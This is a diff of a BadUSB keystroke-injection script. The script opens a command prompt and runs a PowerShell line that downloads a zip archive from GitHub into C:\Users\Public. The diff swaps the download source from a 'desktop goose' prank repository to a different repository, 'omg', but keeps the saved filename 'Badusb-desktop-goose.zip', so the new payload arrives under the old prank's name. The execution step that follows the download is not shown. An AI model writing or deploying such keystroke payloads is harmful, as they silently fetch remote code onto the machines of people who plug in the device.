@@ -12,7 +12,7 @@ STRING cmd
 DELAY 500
 ENTER
 DELAY 500
-STRING powershell (New-Object System.Net.WebClient).DownloadFile('https://github.com/Ferferite/Badusb-desktop-goose/archive/refs/heads/main.zip', 'C:\Users\Public\Badusb-desktop-goose.zip')
+STRING powershell (New-Object System.Net.WebClient).DownloadFile('https://github.com/941water/omg/archive/refs/heads/main.zip', 'C:\Users\Public\Badusb-desktop-goose.zip')
 DELAY 500
 ENTER
 DELAY 1000
